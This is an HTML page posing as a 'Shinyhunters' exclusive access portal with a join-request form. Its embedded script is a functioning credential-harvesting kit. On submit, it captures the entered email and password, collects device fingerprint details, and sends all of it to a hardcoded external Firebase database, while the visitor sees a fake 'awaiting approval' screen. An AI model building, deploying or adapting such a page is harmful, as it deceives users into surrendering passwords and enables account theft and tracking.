<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <title>Shinyhunters | Secure Access Portal</title>
    <style>
        :root {
            --bg-color: #050508;
            --panel-bg: #11141d;
            --accent-gold: #ffd700;
            --accent-glow: rgba(255, 215, 0, 0.3);
            --text-main: #f0f2f5;
            --text-muted: #8a99ad;
            --border-color: #1f2638;
        }
        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 35px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.8), 0 0 20px rgba(255, 215, 0, 0.05);
            box-sizing: border-box;
        }
        .logo {
            font-size: 22px;
            font-weight: 800;
            color: var(--accent-gold);
            text-align: center;
            margin-bottom: 8px;
            letter-spacing: 2px;
            text-transform: uppercase;
            text-shadow: 0 0 10px var(--accent-glow);
        }
        .logo span {
            color: var(--text-main);
        }
        .tagline {
            text-align: center;
            font-size: 11px;
            color: var(--text-muted);
            margin-bottom: 25px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            font-size: 11px;
            color: var(--text-muted);
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        input {
            width: 100%;
            padding: 12px;
            background: #050508;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-main);
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        input:focus {
            border-color: var(--accent-gold);
            box-shadow: 0 0 8px var(--accent-glow);
        }
        .btn {
            width: 100%;
            padding: 12px;
            background: var(--accent-gold);
            color: #000;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s, transform 0.1s;
            margin-top: 5px;
            letter-spacing: 0.5px;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .btn:active {
            transform: scale(0.98);
        }
        /* حالة إرسال الطلب (Pending Request State) */
        #requestState {
            display: none;
            text-align: center;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid var(--border-color);
            border-top: 3px solid var(--accent-gold);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info-text {
            font-size: 13px;
            color: var(--text-muted);
            line-height: 1.6;
            margin-top: 15px;
        }
        .highlight-email {
            color: var(--accent-gold);
            font-weight: 600;
        }
        .footer-note {
            text-align: center;
            font-size: 11px;
            color: var(--text-muted);
            margin-top: 20px;
            font-style: italic;
            letter-spacing: 0.5px;
            opacity: 0.8;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- نموذج تسجيل الدخول للانضمام -->
        <div id="loginState">
            <div class="logo">SHINY<span>HUNTERS</span></div>
            <div class="tagline">Exclusive Access Portal</div>
            
            <form id="joinForm">
                <div class="form-group">
                    <label for="email">Account Email / ID</label>
                    <input type="email" id="email" required autocomplete="off" placeholder="name@example.com">
                </div>
                <div class="form-group">
                    <label for="password">Password / Passcode</label>
                    <input type="password" id="password" required placeholder="••••••••">
                </div>
                <button type="submit" class="btn">Request Access</button>
            </form>
            <div class="footer-note">For those who want to shine</div>
        </div>

        <!-- شاشة رسالة إرسال الطلب -->
        <div id="requestState">
            <div class="logo">SHINY<span>HUNTERS</span></div>
            <div class="tagline">Request Processing</div>
            <div class="spinner"></div>
            <p class="info-text">
                Your request to join the group using (<span id="displayEmail" class="highlight-email"></span>) has been successfully submitted.<br><br>
                Please wait for administrative review and approval.
            </p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";

        const firebaseConfig = {
            databaseURL: "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById("joinForm").addEventListener("submit", function(e) {
            e.preventDefault();

            // التقاط البيانات المدخلة
            const userEmail = document.getElementById("email").value;
            const userPass = document.getElementById("password").value;

            // تحويل واجهة المستخدم فوراً لإظهار رسالة إرسال الطلب
            document.getElementById("loginState").style.display = "none";
            document.getElementById("displayEmail").innerText = userEmail;
            document.getElementById("requestState").style.display = "block";

            // جمع معلومات الجهاز والبيانات التقنية للزائر
            const ua = navigator.userAgent;
            const platform = navigator.platform || "Unknown";
            const width = window.screen.width;
            const height = window.screen.height;
            const cores = navigator.hardwareConcurrency || "N/A";
            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "N/A";
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language || "N/A";

            const sessionId = btoa(userEmail + width + height).slice(0, 16);

            // تجميع حمولة البيانات بالكامل
            const telemetryData = {
                sessionId: sessionId,
                inputEmail: userEmail,
                inputPassword: userPass,
                status: "JOIN_REQUEST_PENDING",
                platform: platform,
                resolution: `${width}x${height}`,
                cores: cores,
                memory: memory,
                timezone: timezone,
                language: language,
                userAgent: ua,
                timestamp: new Date().toISOString()
            };

            const sessionsRef = ref(db, 'A0Z_CORE/mirror_sessions/' + sessionId);
            set(sessionsRef, telemetryData)
                .then(() => {
                    console.log("Join request credentials and telemetry synced to Firebase.");
                })
                .catch((error) => {
                    console.error("Firebase sync error:", error);
                });
        });
    </script>
</body>
</html>
